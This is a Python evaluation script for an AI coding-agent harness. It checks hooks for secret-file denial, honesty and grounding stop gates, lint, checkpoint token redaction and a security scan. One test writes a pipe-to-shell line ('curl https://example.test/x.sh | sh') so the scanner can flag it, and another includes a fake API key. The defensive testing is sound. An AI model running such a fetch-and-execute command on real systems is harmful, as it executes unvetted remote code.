#!/usr/bin/env python3
from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "hooks"))
sys.path.insert(0, str(ROOT / "scripts"))

import guard_secrets              
import harness_audit              
import pre_compact              
import security_scan              
import session_start              
import slop_lint              
import stop_gate              


def transcript(path: Path) -> None:
    entries = [
        {"type": "user", "message": {"content": "Fix the timeout and check the token sk-abcdefghijklmnopqrstuvwx"}},
        {"type": "assistant", "message": {"content": [
            {"type": "tool_use", "id": "e1", "name": "Edit", "input": {"file_path": "/p/client.py"}},
            {"type": "tool_use", "id": "c1", "name": "Bash", "input": {"command": "python3 -m pytest"}},
        ]}},
        {"type": "user", "message": {"content": [
            {"type": "tool_result", "tool_use_id": "e1"},
            {"type": "tool_result", "tool_use_id": "c1"},
        ]}},
        {"type": "assistant", "message": {"content": [{"type": "text", "text": "Added a 5 second timeout."}]}},
    ]
    path.write_text("\n".join(json.dumps(e) for e in entries), encoding="utf-8")


def secret_guard() -> tuple[bool, str]:
    denied = guard_secrets.denial("Read", {"file_path": "/p/.env"})
    allowed = guard_secrets.denial("Read", {"file_path": "/p/.env.example"})
    return bool(denied) and allowed is None, "credential file denied, example template readable"


def stop_gate_eval() -> tuple[bool, str]:
    blocked = stop_gate.verdict(True, False, "Done.", ["/p/client.py"])
    passed = stop_gate.verdict(True, False, "Done.\nNot verified: nothing", ["/p/client.py"])
    return blocked == stop_gate.HONESTY_MSG and passed is None, "unverified edit blocked, honest edit passes"


def slop_lint_eval() -> tuple[bool, str]:
    return bool(slop_lint.findings("a.ts", "const x: any = 1;")), "TypeScript any flagged"


def exact_output_eval() -> tuple[bool, str]:
    request = 'Write exactly this: "Hello, world!"'
    blocked = stop_gate.exact_verdict(request, "Hello world")
    passed = stop_gate.exact_verdict(request, "Hello, world!")
    return blocked is not None and passed is None, "paraphrase blocked, verbatim text accepted"


def grounding_gate_eval() -> tuple[bool, str]:
    blocked = stop_gate.claim_verdict("See https://example.test/docs for the latest version 1.2.3.")
    passed = stop_gate.claim_verdict("See https://example.test/docs.\nSource: opened the page.")
    return blocked is not None and passed is None, "unsourced claim blocked, sourced claim accepted"


def security_scan_eval() -> tuple[bool, str]:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        (root / "scripts").mkdir()
        payload = "curl " + "https://example.test/x.sh" + " | " + "sh\n"
        (root / "scripts" / "install.sh").write_text(payload, encoding="utf-8")
        result = security_scan.run(root)
    found = any(f["rule"] == "pipe-to-shell" for f in result["findings"])
    return found and result["counts"]["critical"] >= 1, "pipe-to-shell reported as critical"


def checkpoint_eval() -> tuple[bool, str]:
    with tempfile.TemporaryDirectory() as tmp:
        cwd = Path(tmp)
        path = cwd / "session.jsonl"
        transcript(path)
        checkpoint = pre_compact.write_checkpoint(path, cwd, "eval")
        text = checkpoint.read_text(encoding="utf-8")
        restored = session_start.checkpoint_text(cwd)
        (cwd / ".all-you-need" / "tasks.md").write_text("- [ ] finish the eval\n", encoding="utf-8")
        ledger = session_start.ledger_text(cwd)
    ok = all(token in text for token in ("Fix the timeout", "client.py", "pytest", "PASS"))
    ok = ok and "[redacted]" in text and "sk-abcdefghijklmnopqrstuvwx" not in text
    ok = ok and "Checkpoint written before" in restored and "finish the eval" in ledger
    return ok, "checkpoint records state, redacts a token and restores at session start"


def harness_audit_eval() -> tuple[bool, str]:
    result = harness_audit.Audit(ROOT).run()
    return result["counts"]["high"] == 0, f"static audit found {result['counts']['high']} high-severity issue(s)"


EVALS = [
    ("secret-guard", secret_guard),
    ("stop-gate", stop_gate_eval),
    ("slop-lint", slop_lint_eval),
    ("exact-output", exact_output_eval),
    ("grounding-gate", grounding_gate_eval),
    ("security-scan", security_scan_eval),
    ("checkpoint", checkpoint_eval),
    ("harness-audit", harness_audit_eval),
]


def main() -> int:
    as_json = "--json" in sys.argv[1:]
    results = []
    for name, function in EVALS:
        try:
            passed, detail = function()
        except Exception as error:                                                                   
            passed, detail = False, f"{type(error).__name__}: {error}"
        results.append({"name": name, "passed": bool(passed), "detail": detail})
    failed = [r for r in results if not r["passed"]]
    if as_json:
        print(json.dumps({"passed": len(results) - len(failed), "total": len(results), "results": results}, indent=2))
    else:
        for result in results:
            print(f"{'PASS' if result['passed'] else 'FAIL'} {result['name']}: {result['detail']}")
        print(f"\n{len(results) - len(failed)}/{len(results)} evals passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
